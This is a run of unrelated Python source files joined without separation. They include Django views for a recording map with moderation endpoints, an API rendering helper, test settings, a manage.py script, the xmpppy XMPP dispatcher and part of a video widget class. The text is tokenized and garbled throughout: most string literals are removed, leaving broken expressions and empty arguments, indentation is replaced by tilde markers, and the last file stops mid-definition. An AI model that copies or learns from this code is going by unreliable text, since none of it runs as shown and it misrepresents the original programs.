~~ ~~ from django . http import HttpResponse , HttpResponseRedirect , HttpResponseNotFound \n 
from django . template import Context , loader \n 
from django . core . urlresolvers import reverse \n 
from django . template import RequestContext \n 
from django . shortcuts import get_object_or_404 , render_to_response \n 
from django . core . exceptions import ObjectDoesNotExist \n 
from datetime import datetime \n 
from tagging . models import Tag , TaggedItem \n 
from django . views . decorators . csrf import csrf_exempt \n 
from django . contrib . auth . models import User \n 
from django . contrib . auth . decorators import login_required \n 
from django . contrib . auth import authenticate , login \n 
from django . core . mail import send_mail \n 
from django . conf import settings \n 
from django . http import Http404 \n 
from django . db . models import Q \n 
import json \n 
\n 
from openwatch . recordings . models import Recording \n 
from openwatch import recording_tags \n 
\n 
\n 
@ login_required \n 
def moderate ( request ) : \n 
~~~ \n 
\n 
response_values = { } \n 
\n 
org_tag = request . user . get_profile ( ) . org_tag \n 
\n 
\n 
if not request . user . is_superuser and ( not request . user . get_profile ( ) . can_moderate or org_tag == ) : \n 
~~~ raise Http404 \n 
\n 
~~ if recording_tags . ACLU_NJ in org_tag : \n 
# Center on New Jersey \n 
~~~ location = { } \n 
location [ ] = 40.167274 \n 
location [ ] = - 74.616338 \n 
response_values [ ] = location \n 
\n 
~~ response_values [ ] = \n 
\n 
return render_to_response ( , response_values , context_instance = RequestContext ( request ) ) \n 
\n 
\n 
\n 
~~ def map ( request ) : \n 
\n 
#total = len(featureset) \n 
~~~ total = "lots!" \n 
return render_to_response ( , { : total } , context_instance = RequestContext ( request ) ) \n 
\n 
# def map_zipcode(request, zipcode): \n 
\n 
#     #total = len(featureset) \n 
#     total = ">40000" \n 
#     try: \n 
#         location = Location.objects.get(zipcode=zipcode) \n 
#     except: \n 
\n 
\n 
\n 
~~ def size ( request ) : \n 
~~~ featureset = Recording . objects . filter ( ~ Q ( lat = None ) , ~ Q ( lon = None ) , ~ Q ( jtype = ) ) . exclude ( location__exact = ) . exclude ( location__exact = ) . order_by ( ) \n 
total = len ( featureset ) \n 
return render_to_response ( , { : total } , context_instance = RequestContext ( request ) ) \n 
\n 
~~ def redir ( self ) : \n 
~~~ return HttpResponseRedirect ( ) \n 
\n 
# def map_tag(request, tag=None): \n 
\n 
#     #0 Responses \n 
#     try: \n 
#         query_tag = Tag.objects.get(name=tag) \n 
#     except Exception, e: \n 
\n 
\n 
#     entries = TaggedItem.objects.get_by_model(Recording, query_tag) \n 
\n 
\n 
\n 
\n 
\n 
~~ def map_json ( request ) : \n 
\n 
~~~ featureset = Recording . objects . all ( ) . order_by ( ) . filter ( ~ Q ( location = ) ) . exclude ( location__isnull = True ) . exclude ( location__exact = ) [ : 750 ] \n 
resp = encode_queryset ( featureset ) \n 
return HttpResponse ( resp , mimetype = "application/json" ) \n 
\n 
\n 
~~ @ login_required \n 
def map_json_moderate ( request ) : \n 
# If moderating, only return recordings that are not org-approved \n 
\n 
~~~ org_tag = request . user . get_profile ( ) . org_tag \n 
if org_tag != : \n 
\n 
~~~ featureset = Recording . objects . filter ( org_approved = False , org_flagged = False , tags__contains = org_tag ) \n 
~~ else : \n 
~~~ featureset = Recording . objects . all ( ) \n 
\n 
\n 
~~ featureset = featureset . order_by ( ) . filter ( ~ Q ( location = ) ) . exclude ( location__isnull = True ) . exclude ( location__exact = ) \n 
resp = encode_queryset ( featureset ) \n 
return HttpResponse ( resp , mimetype = "application/json" ) \n 
\n 
# def map_tag_json(request, tag): \n 
\n 
#     #0 Responses \n 
#     try: \n 
#         query_tag = Tag.objects.get(name=tag) \n 
#     except Exception, e: \n 
#         return HttpResponse("{\\"objects\\":[]}", mimetype="application/json") \n 
\n 
#     entries = TaggedItem.objects.get_by_model(Recording, query_tag) \n 
\n 
\n 
#     resp = encode_queryset(featureset) \n 
#     return HttpResponse(resp, mimetype="application/json") \n 
\n 
\n 
# def map_tag_location(request, tag=None, ne_lat=0, ne_lon=0, sw_lat=0, sw_lon=0): \n 
\n 
#     ne_lat = float(ne_lat) \n 
#     ne_lon = float(ne_lon) \n 
#     sw_lat = float(sw_lat) \n 
#     sw_lon = float(sw_lon) \n 
\n 
#     #0 Responses \n 
#     try: \n 
#         query_tag = Tag.objects.get(name=tag) \n 
#     except Exception, e: \n 
\n 
\n 
#     entries = TaggedItem.objects.get_by_model(Recording, query_tag) \n 
\n 
\n 
\n 
\n 
\n 
~~ def map_location_json ( request , ne_lat = 0 , ne_lon = 0 , sw_lat = 0 , sw_lon = 0 ) : \n 
\n 
~~~ ne_lat = float ( ne_lat ) \n 
ne_lon = float ( ne_lon ) \n 
sw_lat = float ( sw_lat ) \n 
sw_lon = float ( sw_lon ) \n 
\n 
featureset = Recording . objects . filter ( lat__lt = ne_lat , lat__gt = sw_lat , lon__lt = ne_lon , lon__gt = sw_lon ) . order_by ( ) . exclude ( location__isnull = True ) . exclude ( location__exact = ) . exclude ( location__exact = ) . exclude ( location__exact = ) [ : 750 ] \n 
\n 
\n 
if len ( featureset ) < 1 : \n 
~~~ return HttpResponse ( "{\\"objects\\":[]}" , mimetype = "application/json" ) \n 
\n 
~~ resp = encode_queryset ( featureset ) \n 
return HttpResponse ( resp , mimetype = "application/json" ) \n 
\n 
# def about(request): \n 
\n 
\n 
# Encoders \n 
\n 
~~ def encode_queryset ( featureset ) : \n 
~~~ resp = \'{"objects":[\' \n 
for obj in featureset : \n 
~~~ resp = resp + json . dumps ( obj . to_dict ( ) ) + \n 
~~ resp = resp [ : - 1 ] + \n 
\n 
return resp """\n\nThis is based off of Django\'s own shorcuts.py which provides render_to_response.\n\nThe key function here is easy_api_render_to_response()\n\n""" \n 
~~ from django . template import loader , RequestContext \n 
from django . http import HttpResponse , Http404 \n 
from django . http import HttpResponseRedirect , HttpResponsePermanentRedirect \n 
from django . db . models . base import ModelBase \n 
from django . db . models . manager import Manager \n 
from django . db . models . query import QuerySet \n 
from django . core import urlresolvers \n 
from django . utils import six \n 
\n 
import datetime \n 
try : \n 
~~~ import json \n 
~~ except Exception , e : \n 
~~~ import simplejson as json # Support for older Python \n 
\n 
~~ from . dumper import DataDumper # Probably can be deprecated. \n 
from dicttoxml import dicttoxml as dict2xml # Requirest dict2xml dep. \n 
from xml . dom . minidom import parseString # For prettyfication \n 
import yaml \n 
\n 
def render_to_easy_api_response ( * args , ** kwargs ) : \n 
~~~ """\n    Returns a HttpResponse whose content is filled with the result of calling\n    django.template.loader.render_to_string() with the passed arguments.\n    """ \n 
httpresponse_kwargs = { : kwargs . pop ( , None ) } \n 
\n 
# This is really quite hacky. \n 
context = kwargs . pop ( ) \n 
processors = context . context_processors \n 
request = processors [ ] [ ] \n 
\n 
if request . GET . has_key ( ) : \n 
~~~ api_type = request . GET [ ] \n 
\n 
\n 
\n 
# Better solutions welcome! \n 
for arg in args : \n 
~~~ passed = arg \n 
\n 
~~ dump_me = { } \n 
for key in passed . keys ( ) : \n 
~~~ value = passed [ key ] \n 
dump_me [ key ] = dump_object ( value ) \n 
\n 
~~ if api_type == : \n 
\n 
# The XML parser chokes on spaces in key names. \n 
# This recursively replaces them with underscores. \n 
~~~ def replace_spaces ( dump_me ) : \n 
~~~ new = { } \n 
for k , v in dump_me . iteritems ( ) : \n 
~~~ if isinstance ( v , dict ) : \n 
~~~ v = replace_spaces ( v ) \n 
~~ new [ k . replace ( , ) ] = v \n 
~~ return new \n 
\n 
~~ new = replace_spaces ( dump_me ) \n 
dump_me = dict2xml ( new ) \n 
\n 
dom = parseString ( dump_me ) # I love pretty APIs! \n 
pretty = dom . toprettyxml ( ) \n 
return HttpResponse ( pretty , content_type = ) \n 
~~ if api_type == : \n 
~~~ yml = yaml . safe_dump ( dump_me ) \n 
return HttpResponse ( yml , content_type = ) \n 
~~ else : \n 
~~~ dump_me = json . dumps ( dump_me , indent = 2 ) # Indents for pretty \n 
return HttpResponse ( dump_me , content_type = ) \n 
\n 
~~ ~~ return HttpResponse ( loader . render_to_string ( * args , ** kwargs ) , ** httpresponse_kwargs ) \n 
\n 
~~ def render_to_response ( * args , ** kwargs ) : \n 
~~~ """\n    This is just a wrapper around render_to_easy_api_response to make it easier to use as a drop-in replacement.\n    """ \n 
\n 
return render_to_easy_api_response ( * args , ** kwargs ) \n 
\n 
### \n 
# \n 
# Serializers stuff. Mostly stolen from what I did making django-knockout-modeler. \n 
# \n 
## \n 
\n 
~~ def dump_object ( queryset ) : \n 
\n 
# Nasty. \n 
~~~ if str ( type ( queryset ) ) != "<class \'django.db.models.query.QuerySet\'>" : \n 
~~~ d = DataDumper ( ) \n 
ret = d . dump ( queryset ) \n 
return ret \n 
\n 
~~ try : \n 
~~~ modelName = queryset [ 0 ] . __class__ . __name__ \n 
modelNameData = [ ] \n 
\n 
fields = get_fields ( queryset [ 0 ] ) \n 
\n 
for obj in queryset : \n 
~~~ temp_dict = dict ( ) \n 
for field in fields : \n 
~~~ try : \n 
~~~ attribute = getattr ( obj , str ( field ) ) \n 
\n 
# Should sanitization be up to the API consumer? Probably. \n 
# if not safe: \n 
#     if isinstance(attribute, basestring): \n 
#         attribute = cgi.escape(attribute) \n 
\n 
temp_dict [ field ] = attribute \n 
~~ except Exception , e : \n 
~~~ continue \n 
~~ ~~ modelNameData . append ( temp_dict ) \n 
\n 
~~ dthandler = lambda obj : obj . isoformat ( ) if isinstance ( obj , datetime . datetime ) or isinstance ( obj , datetime . date ) else None \n 
return json . loads ( json . dumps ( modelNameData , default = dthandler ) ) \n 
~~ except Exception , e : \n 
~~~ return \n 
\n 
~~ ~~ def get_fields ( model ) : \n 
\n 
~~~ try : \n 
~~~ if hasattr ( model , "easy_api_fields" ) : \n 
~~~ fields = model . easy_api_fields ( ) \n 
~~ else : \n 
~~~ try : \n 
~~~ fields = model . to_dict ( ) . keys ( ) \n 
~~ except Exception , e : \n 
~~~ fields = model . _meta . get_all_field_names ( ) \n 
\n 
~~ ~~ return fields \n 
\n 
# Crash proofing \n 
~~ except Exception , e : \n 
~~~ return [ ] \n 
~~ ~~ class SimpleEngagementCalculator ( object ) : \n 
\n 
~~~ def calculate_user_engagement_score ( self , user , start_date , end_date ) : \n 
~~~ return 0 \n 
\n 
~~ ~~ ROOT_URLCONF = None \n 
DATABASE_ENGINE = \n 
DATABASE_NAME = \n 
DATABASE_SUPPORTS_TRANSACTIONS = False \n 
INSTALLED_APPS = [ \n 
, \n 
, \n 
, \n 
, \n 
] \n 
TEMPLATE_CONTEXT_PROCESSORS = ( \n 
"django.core.context_processors.auth" , \n 
"django.core.context_processors.debug" , \n 
"django.core.context_processors.i18n" , \n 
"django.core.context_processors.media" , \n 
"django.core.context_processors.request" ) \n 
\n 
#!/usr/bin/env python \n 
import os \n 
import sys \n 
\n 
if __name__ == "__main__" : \n 
~~~ os . environ . setdefault ( "DJANGO_SETTINGS_MODULE" , "test_settings" ) \n 
\n 
from django . core . management import execute_from_command_line \n 
\n 
is_testing = in sys . argv \n 
\n 
if is_testing : \n 
~~~ import coverage \n 
cov = coverage . coverage ( include = "django_zappa/*" , omit = [ ] ) \n 
cov . erase ( ) \n 
cov . start ( ) \n 
\n 
~~ execute_from_command_line ( sys . argv ) \n 
\n 
if is_testing : \n 
~~~ cov . stop ( ) \n 
cov . save ( ) \n 
cov . report ( ) \n 
##   transports.py \n 
## \n 
##   Copyright (C) 2003-2005 Alexey "Snake" Nezhdanov \n 
## \n 
##   This program is free software; you can redistribute it and/or modify \n 
##   it under the terms of the GNU General Public License as published by \n 
##   the Free Software Foundation; either version 2, or (at your option) \n 
##   any later version. \n 
## \n 
##   This program is distributed in the hope that it will be useful, \n 
##   but WITHOUT ANY WARRANTY; without even the implied warranty of \n 
##   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the \n 
##   GNU General Public License for more details. \n 
\n 
# $Id: dispatcher.py,v 1.42 2007/05/18 23:18:36 normanr Exp $ \n 
\n 
~~ ~~ """\nMain xmpppy mechanism. Provides library with methods to assign different handlers\nto different XMPP stanzas.\nContains one tunable attribute: DefaultTimeout (25 seconds by default). It defines time that \nDispatcher.SendAndWaitForResponce method will wait for reply stanza before giving up.\n""" \n 
\n 
import simplexml , time , sys \n 
from protocol import * \n 
from client import PlugIn \n 
\n 
DefaultTimeout = 25 \n 
ID = 0 \n 
\n 
class Dispatcher ( PlugIn ) : \n 
~~~ """ Ancestor of PlugIn class. Handles XMPP stream, i.e. aware of stream headers.\n        Can be plugged out/in to restart these headers (used for SASL f.e.). """ \n 
def __init__ ( self ) : \n 
~~~ PlugIn . __init__ ( self ) \n 
DBG_LINE = \n 
self . handlers = { } \n 
self . _expected = { } \n 
self . _defaultHandler = None \n 
self . _pendingExceptions = [ ] \n 
self . _eventHandler = None \n 
self . _cycleHandlers = [ ] \n 
self . _exported_methods = [ self . Process , self . RegisterHandler , self . RegisterDefaultHandler , self . RegisterEventHandler , self . UnregisterCycleHandler , self . RegisterCycleHandler , self . RegisterHandlerOnce , self . UnregisterHandler , self . RegisterProtocol , self . WaitForResponse , self . SendAndWaitForResponse , self . send , self . disconnect , self . SendAndCallForResponse , ] \n 
\n 
~~ def dumpHandlers ( self ) : \n 
~~~ """ Return set of user-registered callbacks in it\'s internal format.\n            Used within the library to carry user handlers set over Dispatcher replugins. """ \n 
return self . handlers \n 
~~ def restoreHandlers ( self , handlers ) : \n 
~~~ """ Restores user-registered callbacks structure from dump previously obtained via dumpHandlers.\n            Used within the library to carry user handlers set over Dispatcher replugins. """ \n 
self . handlers = handlers \n 
\n 
~~ def _init ( self ) : \n 
~~~ """ Registers default namespaces/protocols/handlers. Used internally.  """ \n 
self . RegisterNamespace ( ) \n 
self . RegisterNamespace ( NS_STREAMS ) \n 
self . RegisterNamespace ( self . _owner . defaultNamespace ) \n 
self . RegisterProtocol ( , Iq ) \n 
self . RegisterProtocol ( , Presence ) \n 
self . RegisterProtocol ( , Message ) \n 
self . RegisterDefaultHandler ( self . returnStanzaHandler ) \n 
self . RegisterHandler ( , self . streamErrorHandler , xmlns = NS_STREAMS ) \n 
\n 
~~ def plugin ( self , owner ) : \n 
~~~ """ Plug the Dispatcher instance into Client class instance and send initial stream header. Used internally.""" \n 
self . _init ( ) \n 
for method in self . _old_owners_methods : \n 
~~~ if method . __name__ == : self . _owner_send = method ; break \n 
~~ self . _owner . lastErrNode = None \n 
self . _owner . lastErr = None \n 
self . _owner . lastErrCode = None \n 
self . StreamInit ( ) \n 
\n 
~~ def plugout ( self ) : \n 
~~~ """ Prepares instance to be destructed. """ \n 
self . Stream . dispatch = None \n 
self . Stream . DEBUG = None \n 
self . Stream . features = None \n 
self . Stream . destroy ( ) \n 
\n 
~~ def StreamInit ( self ) : \n 
~~~ """ Send an initial stream header. """ \n 
self . Stream = simplexml . NodeBuilder ( ) \n 
self . Stream . _dispatch_depth = 2 \n 
self . Stream . dispatch = self . dispatch \n 
self . Stream . stream_header_received = self . _check_stream_start \n 
self . _owner . debug_flags . append ( simplexml . DBG_NODEBUILDER ) \n 
self . Stream . DEBUG = self . _owner . DEBUG \n 
self . Stream . features = None \n 
self . _metastream = Node ( ) \n 
self . _metastream . setNamespace ( self . _owner . Namespace ) \n 
self . _metastream . setAttr ( , ) \n 
self . _metastream . setAttr ( , NS_STREAMS ) \n 
self . _metastream . setAttr ( , self . _owner . Server ) \n 
self . _owner . send ( "<?xml version=\'1.0\'?>%s>" % str ( self . _metastream ) [ : - 2 ] ) \n 
\n 
~~ def _check_stream_start ( self , ns , tag , attrs ) : \n 
~~~ if ns < > NS_STREAMS or tag < > : \n 
~~~ raise ValueError ( % ( tag , ns ) ) \n 
\n 
~~ ~~ def Process ( self , timeout = 0 ) : \n 
~~~ """ Check incoming stream for data waiting. If "timeout" is positive - block for as max. this time.\n            Returns:\n            1) length of processed data if some data were processed;\n            2) \'0\' string if no data were processed but link is alive;\n            3) 0 (zero) if underlying connection is closed.\n            Take note that in case of disconnection detect during Process() call\n            disconnect handlers are called automatically.\n        """ \n 
for handler in self . _cycleHandlers : handler ( self ) \n 
if len ( self . _pendingExceptions ) > 0 : \n 
~~~ _pendingException = self . _pendingExceptions . pop ( ) \n 
raise _pendingException [ 0 ] , _pendingException [ 1 ] , _pendingException [ 2 ] \n 
~~ if self . _owner . Connection . pending_data ( timeout ) : \n 
~~~ try : data = self . _owner . Connection . receive ( ) \n 
except IOError : return \n 
self . Stream . Parse ( data ) \n 
if len ( self . _pendingExceptions ) > 0 : \n 
~~~ _pendingException = self . _pendingExceptions . pop ( ) \n 
raise _pendingException [ 0 ] , _pendingException [ 1 ] , _pendingException [ 2 ] \n 
~~ if data : return len ( data ) \n 
~~ return # It means that nothing is received but link is alive. \n 
\n 
~~ def RegisterNamespace ( self , xmlns , order = ) : \n 
~~~ """ Creates internal structures for newly registered namespace.\n            You can register handlers for this namespace afterwards. By default one namespace\n            already registered (jabber:client or jabber:component:accept depending on context. """ \n 
self . DEBUG ( \'Registering namespace "%s"\' % xmlns , order ) \n 
self . handlers [ xmlns ] = { } \n 
self . RegisterProtocol ( , Protocol , xmlns = xmlns ) \n 
self . RegisterProtocol ( , Protocol , xmlns = xmlns ) \n 
\n 
~~ def RegisterProtocol ( self , tag_name , Proto , xmlns = None , order = ) : \n 
~~~ """ Used to declare some top-level stanza name to dispatcher.\n           Needed to start registering handlers for such stanzas.\n           Iq, message and presence protocols are registered by default. """ \n 
if not xmlns : xmlns = self . _owner . defaultNamespace \n 
self . DEBUG ( \'Registering protocol "%s" as %s(%s)\' % ( tag_name , Proto , xmlns ) , order ) \n 
self . handlers [ xmlns ] [ tag_name ] = { type : Proto , : [ ] } \n 
\n 
~~ def RegisterNamespaceHandler ( self , xmlns , handler , typ = , ns = , makefirst = 0 , system = 0 ) : \n 
~~~ """ Register handler for processing all stanzas for specified namespace. """ \n 
self . RegisterHandler ( , handler , typ , ns , xmlns , makefirst , system ) \n 
\n 
~~ def RegisterHandler ( self , name , handler , typ = , ns = , xmlns = None , makefirst = 0 , system = 0 ) : \n 
~~~ """Register user callback as stanzas handler of declared type. Callback must take\n           (if chained, see later) arguments: dispatcher instance (for replying), incomed\n           return of previous handlers.\n           The callback must raise xmpp.NodeProcessed just before return if it want preven\n           callbacks to be called with the same stanza as argument _and_, more importantly\n           library from returning stanza to sender with error set (to be enabled in 0.2 ve\n            Arguments:\n              "name" - name of stanza. F.e. "iq".\n              "handler" - user callback.\n              "typ" - value of stanza\'s "type" attribute. If not specified any value match\n              "ns" - namespace of child that stanza must contain.\n              "chained" - chain together output of several handlers.\n              "makefirst" - insert handler in the beginning of handlers list instead of\n                adding it to the end. Note that more common handlers (i.e. w/o "typ" and "\n                will be called first nevertheless.\n              "system" - call handler even if NodeProcessed Exception were raised already.\n            """ \n 
if not xmlns : xmlns = self . _owner . defaultNamespace \n 
self . DEBUG ( \'Registering handler %s for "%s" type->%s ns->%s(%s)\' % ( handler , name , typ , ns , xmlns ) , ) \n 
if not typ and not ns : typ = \n 
if not self . handlers . has_key ( xmlns ) : self . RegisterNamespace ( xmlns , ) \n 
if not self . handlers [ xmlns ] . has_key ( name ) : self . RegisterProtocol ( name , Protocol , xmlns , ) \n 
if not self . handlers [ xmlns ] [ name ] . has_key ( typ + ns ) : self . handlers [ xmlns ] [ name ] [ typ + ns ] = [ ] \n 
if makefirst : self . handlers [ xmlns ] [ name ] [ typ + ns ] . insert ( 0 , { : handler , : system } ) \n 
else : self . handlers [ xmlns ] [ name ] [ typ + ns ] . append ( { : handler , : system } ) \n 
\n 
~~ def RegisterHandlerOnce ( self , name , handler , typ = , ns = , xmlns = None , makefirst = 0 , system = 0 ) : \n 
~~~ """ Unregister handler after first call (not implemented yet). """ \n 
if not xmlns : xmlns = self . _owner . defaultNamespace \n 
self . RegisterHandler ( name , handler , typ , ns , xmlns , makefirst , system ) \n 
\n 
~~ def UnregisterHandler ( self , name , handler , typ = , ns = , xmlns = None ) : \n 
~~~ """ Unregister handler. "typ" and "ns" must be specified exactly the same as with registering.""" \n 
if not xmlns : xmlns = self . _owner . defaultNamespace \n 
if not self . handlers . has_key ( xmlns ) : return \n 
if not typ and not ns : typ = \n 
for pack in self . handlers [ xmlns ] [ name ] [ typ + ns ] : \n 
~~~ if handler == pack [ ] : break \n 
~~ else : pack = None \n 
try : self . handlers [ xmlns ] [ name ] [ typ + ns ] . remove ( pack ) \n 
except ValueError : pass \n 
\n 
~~ def RegisterDefaultHandler ( self , handler ) : \n 
~~~ """ Specify the handler that will be used if no NodeProcessed exception were raised.\n            This is returnStanzaHandler by default. """ \n 
self . _defaultHandler = handler \n 
\n 
~~ def RegisterEventHandler ( self , handler ) : \n 
~~~ """ Register handler that will process events. F.e. "FILERECEIVED" event. """ \n 
self . _eventHandler = handler \n 
\n 
~~ def returnStanzaHandler ( self , conn , stanza ) : \n 
~~~ """ Return stanza back to the sender with <feature-not-implemennted/> error set. """ \n 
if stanza . getType ( ) in [ , ] : \n 
~~~ conn . send ( Error ( stanza , ERR_FEATURE_NOT_IMPLEMENTED ) ) \n 
\n 
~~ ~~ def streamErrorHandler ( self , conn , error ) : \n 
~~~ name , text = , error . getData ( ) \n 
for tag in error . getChildren ( ) : \n 
~~~ if tag . getNamespace ( ) == NS_XMPP_STREAMS : \n 
~~~ if tag . getName ( ) == : text = tag . getData ( ) \n 
else : name = tag . getName ( ) \n 
~~ ~~ if name in stream_exceptions . keys ( ) : exc = stream_exceptions [ name ] \n 
else : exc = StreamError \n 
raise exc ( ( name , text ) ) \n 
\n 
~~ def RegisterCycleHandler ( self , handler ) : \n 
~~~ """ Register handler that will be called on every Dispatcher.Process() call. """ \n 
if handler not in self . _cycleHandlers : self . _cycleHandlers . append ( handler ) \n 
\n 
~~ def UnregisterCycleHandler ( self , handler ) : \n 
~~~ """ Unregister handler that will is called on every Dispatcher.Process() call.""" \n 
if handler in self . _cycleHandlers : self . _cycleHandlers . remove ( handler ) \n 
\n 
~~ def Event ( self , realm , event , data ) : \n 
~~~ """ Raise some event. Takes three arguments:\n            1) "realm" - scope of event. Usually a namespace. \n            2) "event" - the event itself. F.e. "SUCESSFULL SEND".\n            3) data that comes along with event. Depends on event.""" \n 
if self . _eventHandler : self . _eventHandler ( realm , event , data ) \n 
\n 
~~ def dispatch ( self , stanza , session = None , direct = 0 ) : \n 
~~~ """ Main procedure that performs XMPP stanza recognition and calling apppropriate handlers for it.\n            Called internally. """ \n 
if not session : session = self \n 
session . Stream . _mini_dom = None \n 
name = stanza . getName ( ) \n 
\n 
if not direct and self . _owner . _route : \n 
~~~ if name == : \n 
~~~ if stanza . getAttr ( ) == None : \n 
~~~ if len ( stanza . getChildren ( ) ) == 1 : \n 
~~~ stanza = stanza . getChildren ( ) [ 0 ] \n 
name = stanza . getName ( ) \n 
~~ else : \n 
~~~ for each in stanza . getChildren ( ) : \n 
~~~ self . dispatch ( each , session , direct = 1 ) \n 
~~ return \n 
~~ ~~ ~~ elif name == : \n 
~~~ return \n 
~~ elif name in ( , ) : \n 
~~~ pass \n 
~~ else : \n 
~~~ raise UnsupportedStanzaType ( name ) \n 
\n 
~~ ~~ if name == : session . Stream . features = stanza \n 
\n 
xmlns = stanza . getNamespace ( ) \n 
if not self . handlers . has_key ( xmlns ) : \n 
~~~ self . DEBUG ( "Unknown namespace: " + xmlns , ) \n 
xmlns = \n 
~~ if not self . handlers [ xmlns ] . has_key ( name ) : \n 
~~~ self . DEBUG ( "Unknown stanza: " + name , ) \n 
name = \n 
~~ else : \n 
~~~ self . DEBUG ( "Got %s/%s stanza" % ( xmlns , name ) , ) \n 
\n 
~~ if stanza . __class__ . __name__ == : stanza = self . handlers [ xmlns ] [ name ] [ type ] ( node = stanza ) \n 
\n 
typ = stanza . getType ( ) \n 
if not typ : typ = \n 
stanza . props = stanza . getProperties ( ) \n 
ID = stanza . getID ( ) \n 
\n 
session . DEBUG ( "Dispatching %s stanza with type->%s props->%s id->%s" % ( name , typ , stanza . props , ID ) , ) \n 
\n 
list = [ ] # we will use all handlers: \n 
if self . handlers [ xmlns ] [ name ] . has_key ( typ ) : list . append ( typ ) # from very common... \n 
for prop in stanza . props : \n 
~~~ if self . handlers [ xmlns ] [ name ] . has_key ( prop ) : list . append ( prop ) \n 
if typ and self . handlers [ xmlns ] [ name ] . has_key ( typ + prop ) : list . append ( typ + prop ) # ...to very particular \n 
\n 
~~ chain = self . handlers [ xmlns ] [ ] [ ] \n 
for key in list : \n 
~~~ if key : chain = chain + self . handlers [ xmlns ] [ name ] [ key ] \n 
\n 
~~ output = \n 
if session . _expected . has_key ( ID ) : \n 
~~~ user = 0 \n 
if type ( session . _expected [ ID ] ) == type ( ( ) ) : \n 
~~~ cb , args = session . _expected [ ID ] \n 
session . DEBUG ( "Expected stanza arrived. Callback %s(%s) found!" % ( cb , args ) , ) \n 
try : cb ( session , stanza , ** args ) \n 
except Exception , typ : \n 
~~~ if typ . __class__ . __name__ < > : raise \n 
~~ ~~ else : \n 
~~~ session . DEBUG ( "Expected stanza arrived!" , ) \n 
session . _expected [ ID ] = stanza \n 
~~ ~~ else : user = 1 \n 
for handler in chain : \n 
~~~ if user or handler [ ] : \n 
~~~ try : \n 
~~~ handler [ ] ( session , stanza ) \n 
~~ except Exception , typ : \n 
~~~ if typ . __class__ . __name__ < > : \n 
~~~ self . _pendingExceptions . insert ( 0 , sys . exc_info ( ) ) \n 
return \n 
~~ user = 0 \n 
~~ ~~ ~~ if user and self . _defaultHandler : self . _defaultHandler ( session , stanza ) \n 
\n 
~~ def WaitForResponse ( self , ID , timeout = DefaultTimeout ) : \n 
~~~ """ Block and wait until stanza with specific "id" attribute will come.\n            If no such stanza is arrived within timeout, return None.\n            If operation failed for some reason then owner\'s attributes\n            lastErrNode, lastErr and lastErrCode are set accordingly. """ \n 
self . _expected [ ID ] = None \n 
has_timed_out = 0 \n 
abort_time = time . time ( ) + timeout \n 
self . DEBUG ( "Waiting for ID:%s with timeout %s..." % ( ID , timeout ) , ) \n 
while not self . _expected [ ID ] : \n 
~~~ if not self . Process ( 0.04 ) : \n 
~~~ self . _owner . lastErr = "Disconnect" \n 
return None \n 
~~ if time . time ( ) > abort_time : \n 
~~~ self . _owner . lastErr = "Timeout" \n 
return None \n 
~~ ~~ response = self . _expected [ ID ] \n 
del self . _expected [ ID ] \n 
if response . getErrorCode ( ) : \n 
~~~ self . _owner . lastErrNode = response \n 
self . _owner . lastErr = response . getError ( ) \n 
self . _owner . lastErrCode = response . getErrorCode ( ) \n 
~~ return response \n 
\n 
~~ def SendAndWaitForResponse ( self , stanza , timeout = DefaultTimeout ) : \n 
~~~ """ Put stanza on the wire and wait for recipient\'s response to it. """ \n 
return self . WaitForResponse ( self . send ( stanza ) , timeout ) \n 
\n 
~~ def SendAndCallForResponse ( self , stanza , func , args = { } ) : \n 
~~~ """ Put stanza on the wire and call back when recipient replies.\n            Additional callback arguments can be specified in args. """ \n 
self . _expected [ self . send ( stanza ) ] = ( func , args ) \n 
\n 
~~ def send ( self , stanza ) : \n 
~~~ """ Serialise stanza and put it on the wire. Assign an unique ID to it before send.\n            Returns assigned ID.""" \n 
if type ( stanza ) in [ type ( ) , type ( ) ] : return self . _owner_send ( stanza ) \n 
if not isinstance ( stanza , Protocol ) : _ID = None \n 
elif not stanza . getID ( ) : \n 
~~~ global ID \n 
ID += 1 \n 
_ID = ` ID ` \n 
stanza . setID ( _ID ) \n 
~~ else : _ID = stanza . getID ( ) \n 
if self . _owner . _registered_name and not stanza . getAttr ( ) : stanza . setAttr ( , self . _owner . _registered_name ) \n 
if self . _owner . _route and stanza . getName ( ) != : \n 
~~~ to = self . _owner . Server \n 
if stanza . getTo ( ) and stanza . getTo ( ) . getDomain ( ) : \n 
~~~ to = stanza . getTo ( ) . getDomain ( ) \n 
~~ frm = stanza . getFrom ( ) \n 
if frm . getDomain ( ) : \n 
~~~ frm = frm . getDomain ( ) \n 
~~ route = Protocol ( , to = to , frm = frm , payload = [ stanza ] ) \n 
stanza = route \n 
~~ stanza . setNamespace ( self . _owner . Namespace ) \n 
stanza . setParent ( self . _metastream ) \n 
self . _owner_send ( stanza ) \n 
return _ID \n 
\n 
~~ def disconnect ( self ) : \n 
~~~ """ Send a stream terminator and and handle all incoming stanzas before stream closure. """ \n 
self . _owner_send ( ) \n 
while self . Process ( 1 ) : pass \n 
~~ ~~ from . gl_utils import * \n 
from . texture import VideoTexture \n 
\n 
from . widget import Widget , BGUI_DEFAULT , WeakMethod \n 
from . image import Image \n 
\n 
\n 
class Video ( Image ) : \n 
~~~ """Widget for displaying video""" \n 
\n 
def __init__ ( self , parent , vid , name = None , play_audio = False , repeat = 0 , aspect = None , size = [ 1 , 1 ] , pos = [ 0 , 0 ] , \n 
sub_theme = , options = BGUI_DEFAULT ) : \n 
~~~ """\n\t\t:param parent: the widget\'s parent\n\t\t:param name: the name of the widget\n\t\t:param vid: the video to use for the widget\n\t\t:param play_audio: play the audio track of the video\n\t\t:param repeat: how many times to repeat the video (-1 = infinite)\n\t\t:param aspect: constrain the widget size to a specified aspect ratio\n\t\t:param size: a tuple containing the width and height\n\t\t:param pos: a tuple containing the x and y position\n\t\t:param sub_theme: name of a sub_theme defined in the theme file (similar to CSS classes)\n\t\t:param options: various other options\n\n\t\t""" \n 
\n 
Image . __init__ ( self , parent , name , None , aspect , size , pos , sub_theme = sub_theme , options = options ) \n 
\n 
self . _texture = VideoTexture ( vid , GL_LINEAR , repeat , play_audio ) \n 
\n 
self . _on_finish = None \n 
self . _on_finish_called = False \n 
\n 
~~ def play ( self , start , end , use_frames = True , fps = None ) : \n 
~~~ self . _texture . play ( start , end , use_frames , fps ) \n 
\n 
# Reset the on_finish callback after every play \n 
self . _on_finish_called = False \n 
\n 
~~ @ property \n 
def on_finish ( self ) : \n 
~~~ """The widget\'s on_finish callback""" \n 
return self . _on_finish \n 
\n 
~~ @ on_finish . setter \n 
